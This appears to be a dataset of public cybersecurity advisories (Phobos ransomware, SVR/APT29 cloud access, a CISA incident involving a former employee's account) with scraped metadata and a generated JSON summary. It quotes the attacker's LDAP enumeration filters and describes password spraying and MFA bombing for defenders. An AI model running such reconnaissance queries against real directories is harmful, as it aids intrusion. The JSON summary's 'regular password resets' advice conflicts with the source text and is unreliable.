Technique Title 
ID 
Use 
Data Encrypted for Impact 
T1486 
Phobos threat actors use the Phobos.exe 
command to encrypt data on all logical drives 
connected to the network. 
Inhibit System Recovery 
T1490 
Phobos threat actors may delete or remove 
backups to include volume shadow copies from 
Windows environments to prevent victim data 
recovery response efforts. 
Financial Theft 
T1657 
Phobos threat actor’s extort victims for financial 
gain. 
MITIGATIONS 
The FBI, CISA, and MS-ISAC recommend 
organizations implement the mitigations 
below to improve your organization’s 
cybersecurity posture against actors’ 
activity. These mitigations align with the 
Cross-Sector Cybersecurity Performance 
Goals (CPGs) developed by CISA and the 
National Institute of Standards and 
Technology (NIST). The CPGs provide a 
minimum set of practices and protections 
that CISA and NIST recommend all 
organizations implement. CISA and NIST 
based the CPGs on existing cybersecurity 
frameworks and guidance to protect against the most common and impactful threats, tactics, 
techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more 
information on the CPGs, including additional recommended baseline protections. 
• 
Secure remote access software by applying recommendations from the joint Guide to 
Securing Remote Access Software. 
Secure by Design and Default Mitigations: 
These mitigations apply to all critical infrastructure 
organizations and network defenders. The FBI, 
CISA, and MS-ISAC recommend that software 
manufacturers incorporate secure by design and 
default principles and tactics into their software 
development practices limiting the impact of 
ransomware techniques, thus, strengthening the 
secure posture for their customers. 
For more information on secure by design, see 
CISA’s Secure by Design webpage and joint guide. 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 14 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
• 
Implement application controls to manage and control execution of software, including 
allowlisting remote access programs. 
o Application controls should prevent installation and execution of portable versions of 
unauthorized remote access and other software. A properly configured application allowlist 
solution will block any unlisted application execution. Allowlisting is important because 
antivirus solutions may fail to detect the execution of malicious portable executables when 
the files use any combination of compression, encryption, or obfuscation. 
• 
Implement log collection best practices and use intrusion detection systems to defend 
against threat actors manipulating firewall configurations through early detection [CPG 2.T]. 
o Implement EDR solutions to disrupt threat actor memory allocation techniques. 
• 
Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, 
rigorously apply best practices, for example [CPG 2.W]: 
o Audit the network for systems using RDP. 
o Close unused RDP ports. 
o Enforce account lockouts after a specified number of attempts. 
o Apply phishing-resistant multifactor authentication (MFA). 
o Log RDP login attempts. 
• 
Disable command-line and scripting activities and permissions [CPG 2.N]. 
• 
Review domain controllers, servers, workstations, and active directories for new and/or 
unrecognized accounts [CPG 4.C]. 
• 
Audit user accounts with administrative privileges and configure access controls 
according to the principle of least privilege (PoLP) [CPG 2.E]. 
• 
Reduce the threat of credential compromise via the following: 
o Place domain admin accounts in the protected users’ group to prevent caching of 
password hashes locally. 
o Refrain from storing plaintext credentials in scripts. 
• 
Implement time-based access for accounts at the admin level and higher [CPG 2.A, 2.E]. 
In addition, the authoring authorities of this CSA recommend network defenders apply the following 
mitigations to limit potential adversarial use of common system and network discovery techniques, and 
to reduce the impact and risk of compromise by ransomware or data extortion actors: 
• 
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary 
data and servers in a physically separate, segmented, and secure location (i.e., hard drive, 
storage device, or the cloud). 
• 
Maintain offline backups of data and regularly maintain backup and restoration (daily or 
weekly at minimum). By instituting this practice, an organization limits the severity of disruption 
to its business practices [CPG 2.R]. 
• 
Require all accounts with password logins (e.g., service account, admin accounts, and 
domain admin accounts) to comply with NIST's standards for developing and managing 
password policies. 
o Use longer passwords consisting of at least 15 characters and no more than 64 characters 
in length [CPG 2.B]. 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 15 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
o Store passwords in hashed format using industry-recognized password managers. 
o Add password user “salts” to shared login credentials. 
o Avoid reusing passwords [CPG 2.C]. 
o Implement multiple failed login attempt account lockouts [CPG 2.G]. 
o Disable password “hints.” 
o Refrain from requiring password changes more frequently than once per year. 
Note: NIST guidance suggests favoring longer passwords instead of requiring regular and 
frequent password resets. Frequent password resets are more likely to result in users 
developing password “patterns” cyber criminals can easily decipher. 
o Require administrator credentials to install software. 
• 
Require phishing-resistant multifactor authentication (MFA) for all services to the extent 
possible, particularly for webmail, virtual private networks (VPNs), and accounts that access 
critical systems [CPG 2.H]. 
• 
Segment networks to prevent the spread of ransomware. Network segmentation can help 
prevent the spread of ransomware by controlling traffic flows between—and access to—
various subnetworks and by restricting adversary lateral movement [CPG 2.F]. 
• 
Identify, detect, and investigate abnormal activity and potential traversal of the 
indicated ransomware with a networking monitoring tool. To aid in detecting the 
ransomware, implement a tool that logs and reports all network traffic and activity, including 
lateral movement, on a network. Endpoint detection and response (EDR) tools are particularly 
useful for detecting lateral connections as they have insight into common and uncommon 
network connections for each host [CPG 3.A]. 
• 
Install, regularly update, and enable real time detection for antivirus software on all 
hosts. 
• 
Disable unused ports and protocols [CPG 2.V]. 
• 
Consider adding an email banner to emails received from outside your organization [CPG 
2.M]. 
• 
Disable hyperlinks in received emails. 
• 
Ensure all backup data is encrypted, immutable (i.e., ensure backup data cannot be 
altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K, 2.L, 
2.R]. 
VALIDATE SECURITY CONTROLS 
In addition to applying mitigations, the FBI, CISA, and MS-ISAC recommend exercising, testing, and 
validating your organization's security program against the threat behaviors mapped to the MITRE 
ATT&CK for Enterprise framework in this advisory. The FBI, CISA, and MS-ISAC recommend testing 
your existing security controls inventory to assess how they perform against the ATT&CK techniques 
described in this advisory. 
To get started: 
1. Select an ATT&CK technique described in this advisory (see Tables 4-16). 
2. Align your security technologies against the technique. 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 16 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
3. Test your technologies against the technique. 
4. Analyze your detection and prevention technologies’ performance. 
5. Repeat the process for all security technologies to obtain a set of comprehensive performance 
data. 
6. Tune your security program, including people, processes, and technologies, based on the data 
generated by this process. 
The FBI, CISA, and MS-ISAC recommend continually testing your security program, at scale, in a 
production environment to ensure optimal performance against the MITRE ATT&CK techniques 
identified in this advisory. 
RESOURCES 
• 
Stopransomware.gov is a whole-of-government approach that gives one central location for 
ransomware resources and alerts. 
• 
Resource to mitigate a ransomware attack: CISA, NSA, FBI, and Multi-State Information 
Sharing and Analysis Center’s (MS-ISAC) Joint #StopRansomware Guide. 
• 
SLTT organizations are encouraged to implement MS-ISAC’s Ransomware Defense-in-Depth 
guidance. 
• 
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness 
Assessment. 
• 
CISA: Known Exploited Vulnerabilities Catalog 
• 
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping 
• 
CISA: Decider Tool 
• 
CISA: Cross-Sector Cybersecurity Performance Goals 
• 
CISA: Secure by Design 
• 
CISA: Implementing Phishing-Resistant MFA 
• 
CISA: Guide to Securing Remote Access Software 
REFERENCES 
[1] Privacy Affairs: “Moral” 8Base Ransomware Targets 2 New Victims 
[2] VMware: 8base ransomware: A Heavy Hitting Player 
[3] Infosecurity Magazine: Phobos Ransomware Family Expands With New FAUST Variant 
[4] The Record: Hospitals offline across Romania following ransomware attack on IT platform 
[5] Comparitech: What is Phobos Ransomware & How to Protect Against It? 
[6] Cisco Talos: Understanding the Phobos affiliate structure and activity 
[7] Cisco Talos: A deep dive into Phobos ransomware, recently deployed by 8Base group 
[8] Malwarebytes Labs: A deep dive into Phobos ransomware 
[9] Any Run: Smokeloader 
[10] Malpedia: Smokeloader 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 17 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
[11] Truesec: A case of the FAUST Ransomware 
[12] VirusTotal: Phobos Domain #1 
[13] VirusTotal: Phobos executable: Ahpdate.exe 
[14] VirusTotal: Phobos GUI extension: ELF File 
[15] VirusTotal: Phobos IP address: 185.202.0[.]111 
[16] VirusTotal: Phobos GUI extension: Binary File 
[17] Cisco Talos GitHub: IOCs/2023/11/deep-dive-into-phobos-ransomware.txt at main 
REPORTING 
The FBI is seeking any information that can be shared, to include boundary logs showing 
communication to and from foreign IP addresses, a sample ransom-note, communications with 
Phobos actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.  
Additional details requested include: a targeted company point of contact, status and scope of 
infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial 
attack vector, and host and network-based indicators. 
The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will 
be recovered. Furthermore, payment may also embolden adversaries to target additional 
organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or 
fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, 
the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime 
Complaint Center (IC3), a local FBI Field Office, or to CISA at report@cisa.gov or (888) 282-0870. 
DISCLAIMER 
The FBI does not conduct its investigative activities or base attribution solely on activities protected by 
the First Amendment. Your company has no obligation to respond or provide information back to the 
FBI in response to this engagement. If, after reviewing the information, your company decides to 
provide referral information to the FBI, it must do so in a manner consistent with federal law. The FBI 
does not request or expect your company to take any particular action regarding this information other 
than holding it in confidence due to its sensitive nature. 
The information in this report is being provided “as is” for informational purposes only. The FBI and 
CISA not endorse any commercial product or service, including any subjects of analysis. Any 
reference to specific commercial products, processes, or services by service mark, trademark, 
manufacturer, or otherwise does not constitute or imply endorsement, recommendation, or favoring 
by CISA, the FBI, and the MS-ISAC. 
ACKNOWLEDGEMENTS 
The California Joint Regional Intelligence Center (JRIC, CA) and Israel National Cyber Directorate 
(INCD) contributed to this CSA. 
 
 
 
FBI | CISA | MS-ISAC   
 
Page 18 of 18  |  Product ID: AA24-060A 
TLP:CLEAR 
TLP:CLEAR 
VERSION HISTORY 
February 29, 2024: Initial version. 
",#StopRansomware: Phobos Ransomware,
02-26-2024,https://firebasestorage.googleapis.com/v0/b/ooda-nsec.appspot.com/o/data%2FAdvisory-SVR-cyber-actors-adapt-tactics-for-initial-cloud-access.pdf?alt=media&token=58f1da66-690f-4c49-8a44-6a4388f27abc,"February 2024 
 Crown Copyright 2024 
Advisory 
SVR cyber actors adapt 
tactics for initial cloud 
access  
SVR cyber actors adapt tactics for 
initial cloud access 
How SVR-attributed actors are adapting to the move of 
government and corporations to cloud infrastructure
Overview 
This advisory details recent tactics, techniques and procedures (TTPs) of the 
group commonly known as APT29, also known as Midnight Blizzard, the Dukes or 
Cozy Bear.   
The UK National Cyber Security Centre (NCSC) and international partners assess 
that APT29 is a cyber espionage group, almost certainly part of the SVR, an 
element of the Russian intelligence services. The US National Security Agency 
(NSA), the US Cybersecurity and Infrastructure Security Agency (CISA), the US 
Cyber National Mission Force (CNMF), the Federal Bureau of Investigation (FBI), 
Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), 
the Canadian Centre for Cyber Security (CCCS) and the New Zealand National 
Cyber Security Centre (NCSC) agree with this attribution and the details 
provided in this advisory. 
This advisory provides an overview of TTPs deployed by the actor to gain initial 
access into the cloud environment and includes advice to detect and mitigate 
this activity.  
Previous actor activity 
The NCSC has previously detailed how Russian Foreign Intelligence Service (SVR) 
cyber actors have targeted governmental, think tank, healthcare and energy 
targets for intelligence gain. It has now observed SVR actors expanding their 
targeting to include aviation, education, law enforcement, local and state 
councils, government financial departments and military organisations. 
SVR actors are also known for: 
•
the supply chain compromise of SolarWinds software
•  activity that targeted organisations developing the COVID-19 vaccine 
 
 
 
Evolving TTPs 
As organisations continue to modernise their systems and move to cloud-based 
infrastructure, the SVR has adapted to these changes in the operating 
environment. 
They have to move beyond their traditional means of initial access, such as 
exploiting software vulnerabilities in an on-premise network, and instead target 
the cloud services themselves. 
To access the majority of the victims’ cloud hosted network, actors must first 
successfully authenticate to the cloud provider. Denying initial access to the 
cloud environment can prohibit SVR from successfully compromising their target. 
In contrast, in an on-premise system, more of the network is typically exposed to 
threat actors.  
Below describes in more detail how SVR actors are adapting to continue their 
cyber operations for intelligence gain. These TTPs have been observed in the last 
12 months. 
 Access via service and dormant accounts  
 
Previous SVR campaigns reveal the actors have successfully used brute forcing 
(T1110) and password spraying to access service accounts. This type of account is 
typically used to run and manage applications and services. There is no human 
user behind them so they cannot be easily protected with multi-factor 
authentication (MFA), making these accounts more susceptible to a successful 
compromise. Service accounts are often also highly privileged depending on 
which applications and services they’re responsible for managing. Gaining 
access to these accounts provides threat actors with privileged initial access to 
a network, to launch further operations. 
 
SVR campaigns have also targeted dormant accounts belonging to users who no 
longer work at a victim organisation but whose accounts remain on the system. 
(T1078.004).  
 
Following an enforced password reset for all users during an incident, SVR actors 
have also been observed logging into inactive accounts and following 
instructions to reset the password. This has allowed the actor to regain access 
following incident response eviction activities. 
Cloud-based token authentication 
Account access is typically authenticated by either username and password 
credentials or system-issued access tokens. The NCSC and partners have 
observed SVR actors using tokens to access their victims’ accounts, without 
needing a password (T1528). 
The default validity time of system-issued tokens varies dependant on the 
system, however cloud platforms should allow administrators to adjust the 
validity time as appropriate for their users. More information can be found on this 
in the mitigations section of this advisory. 
Enrolling new devices to the cloud 
On multiple occasions, the SVR has successfully bypassed password 
authentication on personal accounts using password spraying and credential 
reuse. SVR actors have also then bypassed MFA through a technique known as 
‘MFA bombing’ or ‘MFA fatigue’, in which the actors repeatedly push MFA requests 
to a victim’s device until the victim accepts the notification (T1621).  
Once an actor has bypassed these systems to gain access to the cloud 
environment, SVR actors have been observed registering their own device as a 
new device on the cloud tenant (T1098.005). If device validation rules are not set 
up, SVR actors can successfully register their own device and gain access to the 
network.  
By configuring the network with device enrolment policies, there have been 
instances where these measures have defended against SVR actors and denied 
them access to the cloud tenant. 
 
Residential proxies 
As network-level defences improve detection of suspicious activity, SVR actors 
have looked at other ways to stay covert on the internet. A TTP associated with 
this actor is the use of residential proxies (T1090.002). Residential proxies typically 
make traffic appear to originate from IP addresses within internet service 
provider (ISP) ranges used for residential broadband customers and hide the true 
source. This can make it harder to distinguish malicious connections from typical 
users.  This reduces the effectiveness of network defences that use IP addresses 
as indicators of compromise, and so it is important to consider a variety of 
information sources such as application and host-based logging for detecting 
suspicious activity. 
 
Conclusion 
The SVR is a sophisticated actor capable of carrying out a global supply chain 
compromise such as the 2020 SolarWinds, however the guidance in this advisory 
shows that a strong baseline of cyber security fundamentals can help defend 
from such actors.  
For organisations that have moved to cloud infrastructure, a first line of defence 
against an actor such as SVR should be to protect against SVR’s TTPs for initial 
access. By following the mitigations outlined in this advisory, organisations will be 
in a stronger position to defend against this threat. 
Once the SVR gain initial access, the actor is capable of deploying highly 
sophisticated post compromise capabilities such as MagicWeb, as reported in 
2022. Therefore, mitigating against the SVR’s initial access vectors is particularly 
important for network defenders.  
CISA have also produced guidance through their Secure Cloud Business 
Applications (SCuBA) Project which is designed to protect assets stored in cloud 
environments.  
Some of the TTPs listed in this report, such as residential proxies and exploitation 
of system accounts, are similar to those reported as recently as January 2024 by 
Microsoft. 
 
MITRE ATT&CK® 
This report has been compiled with respect to the MITRE ATT&CK® framework, a 
globally accessible knowledge base of adversary tactics and techniques based 
on real-world observations. 
Tactic 
ID 
Technique 
Procedure 
Credential 
Access  
T1110 
Brute forcing 
The SVR use password 
spraying and brute forcing as 
an initial infection vector. 
Initial Access 
T1078.0
04 
Valid Accounts: Cloud 
Accounts 
The SVR use compromised 
credentials to gain access to 
accounts for cloud services, 
including system and 
dormant accounts. 
Credential 
Access 
T1528 
Steal Application Access 
Token 
The SVR use stolen access 
tokens to login to accounts 
without the need for 
passwords. 
Credential 
Access 
T1621 
Multi-Factor 
Authentication Request 
Generation 
The SVR repeatedly push MFA 
requests to a victim’s device 
until the victim accepts the 
notification, providing SVR 
access to the account. 
Command and 
Control 
T1090.0
02 
Proxy: External Proxy 
The SVR use open proxies in 
residential IP ranges to blend 
in with expected IP address 
pools in access logs. 
Persistence 
T1098.0
05 
Account Manipulation: 
Device Registration 
The SVR attempt to register 
their own device on the cloud 
tenant after acquiring access 
to accounts. 
 
 
Mitigation and Detection 
A number of mitigations will be useful in defending against the activity 
described in this advisory:  
> Use multi-factor authentication (/2-factor authentication/two-step 
verification) to reduce the impact of password compromises. See NCSC 
guidance: https://www.ncsc.gov.uk/guidance/multi-factor-
authentication-online-services  and 
https://www.ncsc.gov.uk/guidance/setting-two-factor-authentication-2fa 
> Accounts that cannot use 2SV should have strong, unique passwords. 
User and system accounts should be disabled when no longer required 
with a ‘joiners, movers and leavers’ process in place and regular reviews 
to identify and disable inactive/dormant accounts.  See NCSC guidance: 
https://www.ncsc.gov.uk/collection/10-steps/identity-and-access-
management 
 
> System and service accounts should implement the principle of least 
privilege, providing a tightly scoped access to resources required for the 
service to function. 
 
> Canary service accounts should be created which appear to be valid 
service accounts but are never used by legitimate services. Monitoring 
and alerting on the use of these account provides a high confidence 
signal that they are being used illegitimately and should be investigated 
urgently. 
> Session lifetimes should be kept as short as practical to reduce the 
window of opportunity for an adversary to use stolen session tokens. This 
should be paired with a suitable authentication method that strikes a 
balance between regular user authentication and user experience.  
> Ensure device enrolment policies are configured to only permit authorised 
devices to enrol. Use zero-touch enrolment where possible, or if self-
 
Disclaimer  
This report draws on information derived from NCSC and industry sources. Any 
NCSC findings and recommendations made have not been provided with the 
intention of avoiding all risks and following the recommendations will not remove 
all such risk. Ownership of information risks remains with the relevant system 
owner at all times.  
This information is exempt under the Freedom of Information Act 2000 (FOIA) and 
may be exempt under other UK information legislation.  
Refer any FOIA queries to ncscinfoleg@ncsc.gov.uk.  
All material is UK Crown Copyright © 
enrolment is required then use a strong form of 2SV that is resistant to 
phishing and prompt bombing. Old devices should be prevented from 
(re-)enrolling when no longer required. See NCSC guidance: 
https://www.ncsc.gov.uk/collection/device-security-guidance/getting-
ready/provisioning-and-distributing-devices 
 
> Consider a variety of information sources such as application events and 
host-based logs to help prevent, detect and investigate potential 
malicious behaviour. Focus on the information sources and indicators of 
compromise that have a better rate of false positives. For example, 
looking for changes to user agent strings that could indicate session 
hijacking may be more effective than trying to identify connections from 
suspicious IP addresses. See NCSC guidance:  
https://www.ncsc.gov.uk/guidance/introduction-logging-security-
purposes 
 
 
",SVR cyber actors adapt tactics for initial cloud access,"{
  ""ID"": ""Not provided"",
  ""URL"": ""Not provided"",
  ""Title"": ""SVR cyber actors adapt tactics for initial cloud access"",
  ""Release Date"": ""February 2024"",
  ""Last Updated"": ""February 2024"",
  ""Severity"": ""High"",
  ""Affected Systems"": [
    ""Cloud-based infrastructure of government and corporations, including sectors such as aviation, education, law enforcement, local and state councils, government financial departments, and military organizations""
  ],
  ""Summary"": ""This advisory details the evolving tactics, techniques, and procedures (TTPs) used by APT29, identified as part of the Russian SVR, to gain initial access to cloud environments. As organizations shift to cloud infrastructure, SVR's adaptation includes targeting cloud services directly using various sophisticated methods."",
  ""Procedures"": {
    ""Credential Access"": ""APT29 uses credential-based attacks such as brute forcing, password spraying, and exploiting dormant accounts to gain initial access to cloud services."",
    ""Cloud Token Exploitation"": ""The group manipulates cloud-based token authentication systems to access accounts without needing passwords.""
  },
  ""Tactics"": {
    ""Initial Access"": ""APT29 adapts to target cloud environments by bypassing conventional on-premise network defenses, using compromised cloud service accounts and tokens for access."",
    ""Persistence"": ""Post-access, they attempt to maintain presence in cloud environments by deploying various techniques to remain undetected or regain access via device registrations."",
    ""Defense Evasion"": ""SVR uses methods like 'MFA fatigue' and registering new devices under compromised accounts, minimizing the effectiveness of security measures.""
  },
  ""Techniques"": {
    ""Valid Accounts and Credential Access"": ""APT29 utilizes compromised credentials and service accounts for high-privileged access and stealth."",
    ""Token Manipulation"": ""They exploit the cloud's token-based authentication to maintain access without consistent use of a user's password."",
    ""Device Manipulation"": ""Registering new devices to a compromised cloud tenant to maintain persistence and control.""
  },
  ""Threat Actions"": [
    ""Targeting and compromising cloud-based infrastructure across various sectors"",
    ""Implementation of sophisticated espionage strategies tailored to cloud environments""
  ],
  ""Indicators of Compromise"": {
    ""IPs"": [
      ""Not listed - Use of residential proxies noted""
    ],
    ""Domains"": [
      ""Not listed""
    ],
    ""Hashes"": [
      ""Not listed""
    ]
  },
  ""Mitigation Strategies"": ""Strong cybersecurity fundamentals including multi-factor authentication, regular password resets, and monitoring of service and dormant accounts are critical. Organizations should implement strict device registration controls and monitor for anomalies in authentication tokens and account activities."",
  ""References"": [
    ""https://www.ncsc.gov.uk/guidance/multi-factor-authentication-online-services"",
    ""https://www.ncsc.gov.uk/guidance/setting-two-factor-authentication-2fa"",
    ""https://www.ncsc.gov.uk/collection/10-steps/identity-and-access-management"",
    ""https://www.ncsc.gov.uk/guidance/introduction-logging-security-purposes""
  ]
}"
02-15-2024,https://firebasestorage.googleapis.com/v0/b/ooda-nsec.appspot.com/o/data%2Faa24-046a-threat-actor-leverages-compromised%20account-of%20former-employee.pdf?alt=media&token=15b02d13-0bb1-4c2d-89bc-d88022d71f82," 
 
 
 
 
 
 
  
 
To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact 
CISA’s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870. When available, please include the 
following information regarding the incident: date, time, and location of the incident; type of activity; number of 
people affected; type of equipment used for the activity; the name of the submitting company or organization; and 
a designated point of contact. SLTT organizations should report incidents to the MS-ISAC (866-787-4722 or 
SOC@cisecurity.org). 
This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information 
carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public 
release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction. For 
more information on the Traffic Light Protocol, see cisa.gov/tlp. 
Product ID: AA24-046A 
 
February 15, 2024 
Co-Authored by: 
TLP:CLEAR 
TLP:CLEAR 
Threat Actor Leverages Compromised Account 
of Former Employee to Access State 
Government Organization 
SUMMARY 
The Cybersecurity and Infrastructure Security Agency 
(CISA) and the Multi-State Information Sharing & 
Analysis Center (MS-ISAC) conducted an incident 
response assessment of a state government 
organization’s network environment after documents 
containing host and user information, including 
metadata, were posted on a dark web brokerage site. 
Analysis confirmed that an unidentified threat actor 
compromised network administrator credentials through 
the account of a former employee—a technique 
commonly leveraged by threat actors—to successfully 
authenticate to an internal virtual private network (VPN) 
access point, further navigate the victim’s on-premises 
environment, and execute various lightweight directory 
access protocol (LDAP) queries against a domain controller.[1] Analysis also focused on the victim’s 
Azure environment, which hosts sensitive systems and data, as well as the compromised on-
premises environment. Analysis determined there were no indications the threat actor further 
compromised the organization by moving laterally from the on-premises environment to the Azure 
environment. 
CISA and MS-ISAC are releasing this Cybersecurity Advisory (CSA) to provide network defenders 
with the tactics, techniques, and procedures (TTPs) used by the threat actor and methods to protect 
Actions to take today to mitigate 
malicious cyber activity: 
• 
Continuously remove and disable 
accounts and groups from the 
enterprise that are no longer 
needed, especially privileged 
accounts. 
• 
Enable and enforce multifactor 
authentication with strong 
passwords. 
• 
Store credentials in a secure 
manner, such as with a credential 
manager, vault, or other privilege 
account management solution. 
 
 
 
CISA | MS-ISAC  
Page 2 of 10  |  Product ID: AA24-046A 
TLP:CLEAR 
 
TLP:CLEAR 
against similar exploitation of both unnecessary and privileged accounts. 
TECHNICAL DETAILS 
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE 
ATT&CK Tactics and Techniques section for a table of the threat actor’s activity mapped to MITRE 
ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE 
ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping 
and CISA’s Decider Tool. 
Overview 
A state government organization was notified that documents containing host and user information, 
including metadata, were posted on a dark web brokerage site. After further investigation, the victim 
organization determined that the documents were accessed via the compromised account of a former 
employee. Threat actors commonly leverage valid accounts, including accounts of former employees 
that have not been properly removed from the Active Directory (AD), to gain access to 
organizations.[1] CISA and MS-ISAC assessed that an unidentified threat actor likely accessed 
documents containing host and user information to post on the dark web for profit after gaining 
access through the account of a former employee. 
The scope of this investigation included the victim organization’s on-premises environment, as well as 
their Azure environment, which hosts sensitive systems and data. Analysis determined the threat 
actor did not move laterally from the compromised on-premises network to the Azure environment 
and did not compromise sensitive systems. 
Untitled Goose Tool 
Incident responders collected Azure and Microsoft Defender for Endpoint (MDE) logs using CISA’s 
Untitled Goose Tool—a free tool to help network defenders detect potentially malicious activity in 
Microsoft Azure, Azure Active Directory (AAD), and Microsoft 365 (M365) environments. CISA 
developed the Untitled Goose Tool to export and review AAD sign-in and audit logs, M365 unified 
audit logs (UAL), Azure activity logs, and MDE data. By exporting cloud artifacts, Untitled Goose Tool 
supports incident response teams with environments that do not ingest logs into a security information 
and event management (SIEM) tool. 
Threat Actor Activity 
The logs revealed the threat actor first connected from an unknown virtual machine (VM) to the 
victim’s on-premises environment via internet protocol (IP) addresses within their internal VPN range. 
CISA and MS-ISAC assessed that the threat actor connected to the VM through the victim’s VPN 
[T1133] with the intent to blend in with legitimate traffic to evade detection. 
Initial Access: Compromised Domain Accounts 
USER1: The threat actor gained initial access through the compromised account of a former 
employee with administrative privileges (USER1) [T1078.002] to conduct reconnaissance and 
 
 
 
CISA | MS-ISAC  
Page 3 of 10  |  Product ID: AA24-046A 
TLP:CLEAR 
 
TLP:CLEAR 
discovery activities. The victim organization confirmed that this account was not disabled immediately 
following the employee’s departure. 
• 
The threat actor likely obtained the USER1 account credentials in a separate data breach due 
to the credentials appearing in publicly available channels containing leaked account 
information [T1589.001]. 
• 
USER1 had access to two virtualized servers including SharePoint and the workstation of the 
former employee. The workstation was virtualized from a physical workstation using the 
Veeam Physical to Virtual (P2V) function within the backup software. 
USER2: The threat actor likely obtained the USER2 account credentials from the virtualized 
SharePoint server managed by USER1 [T1213.002]. The victim confirmed that the administrator 
credentials for USER2 were stored locally on this server [T1552.001]. 
• 
Through connection from the VM, the threat actor authenticated to multiple services [T1021] 
via the USER1 account, as well as from an additional compromised global domain 
administrator account (USER2) [T1078.002]. 
• 
The threat actor’s use of the USER2 account was impactful due to the access it granted to both 
the on-premises AD and Azure AD [T1021.007], thus enabling administrative privileges 
[T1078.004]. 
Following notification of the dark web posting, the victim organization immediately disabled the USER1 
account and took the two virtualized servers associated with the former employee offline. The victim 
also changed the password for the USER2 account and removed administrator privileges. Neither of 
the administrative accounts had multifactor authentication (MFA) enabled. 
LDAP Queries 
Through connection from the VM, the threat actor conducted LDAP queries of the AD, likely using the 
open source tool AdFind.exe, based on the format of the output. CISA and MS-ISAC assess the 
threat actor executed the LDAP queries [T1087.002] to collect user, host [T1018], and trust 
relationship information [T1482]. It is also believed the LDAP queries generated the text files the 
threat actor posted for sale on the dark web brokerage site: ad_users.txt, ad_computers.txt, and 
trustdmp.txt. 
Table 1 lists all queries that were conducted between 08:39:43-08:40:56 Coordinated Universal Time 
(UTC). 
Table 1: LDAP Queries Conducted by the Threat Actor 
Query 
Description 
LDAP Search Scope: WholeSubtree, Base Object: dc=[REDACTED],dc=local, 
Search Filter: 
(objectCategory=CN=Person,CN=Schema,CN=Configuration,DC=[REDACTE
D],DC=local) 
Collects names 
and metadata of 
users in the 
domain. 
 
 
 
CISA | MS-ISAC  
Page 4 of 10  |  Product ID: AA24-046A 
TLP:CLEAR 
 
TLP:CLEAR 
Query 
Description 
LDAP Search Scope: WholeSubtree, Base Object: dc=[REDACTED],dc=local, 
Search Filter: 
(objectCategory=CN=Computer,CN=Schema,CN=Configuration,DC=[REDACT
ED],DC=local) 
Collects names 
and metadata of 
hosts in the 
domain. 
LDAP Search Scope: WholeSubtree, Base Object: dc=[REDACTED],dc=local, 
Search Filter: (objectCategory=CN=Trusted-
Domain,CN=Schema,CN=Configuration,DC=[REDACTED],DC=local) 
Collects trust 
information in the 
domain. 
LDAP Search Scope: WholeSubtree, Base Object: 
DC=[REDACTED],DC=local, Search Filter: ( &  ( &  
(sAMAccountType=805306368)  (servicePrincipalName=*) ( ! 
(sAMAccountName=krbtgt) ) ( !  (userAccountControl&2) ) )  (adminCount=1) ) 
Collects Domain 
Administrators 
and Service 
Principals in the 
domain. 
Service Authentication 
Through the VM connection, the threat actor was observed authenticating to various services on the 
victim organization’s network from the USER1 and USER2 administrative accounts. In all instances, the 
threat actor authenticated to the Common Internet File Service (CIFS) on various endpoints 
[T1078.002],[T1021.002]—a protocol used for providing shared access to files and printers between 
machines on the network. This was likely used for file, folder, and directory discovery [T1083], and 
assessed to be executed in an automated manner. 
• 
USER1 authenticated to four services, presumably for the purpose of network and service 
discovery [T1046]. 
• 
USER2 authenticated to twelve services. Note: This account had administrative privileges to 
both the on-premises network and Azure tenant. 
MITRE ATT&CK TACTICS AND TECHNIQUES 
See Tables 2-9 for all referenced threat actor’s tactics and techniques for enterprise environments in 
this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, 
see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider 
Tool. 
Table 2: Reconnaissance 
Technique Title 
ID 
Use 
Gather Victim 
Identity Information: 
Credentials 
T1589.001 
The actor likely gathered USER1 account credentials in a 
data breach where account information appeared in publicly 
available channels. 
 
 
 
 
CISA | MS-ISAC  
Page 5 of 10  |  Product ID: AA24-046A 
TLP:CLEAR 
 
TLP:CLEAR 
Table 3: Initial Access 
Technique Title 
ID 
Use 
Valid Accounts: 
Domain Accounts 
T1078.002 
The actor gained initial access through the compromised 
account of a former employee with administrative privileges 
(USER1). The employee’s account was not immediately 
disabled after their departure. 
Table 4: Persistence 
Technique Title 
ID 
Use 
External Remote 
Services 
T1133 
The actor connected a VM via the victim’s VPN to blend in 
with legitimate traffic to evade detection.  
Table 5: Privilege Escalation 
Technique Title 
ID 
Use 
Valid Accounts: 
Domain Accounts 
T1078.002 
The actor authenticated to multiple services from a 
compromised Global Domain Administrator account (USER2). 
The actor also authenticated to the Common Internet File 
Service (CIFS) on various endpoints. 
Valid Accounts: 
Cloud Accounts 
T1078.004 
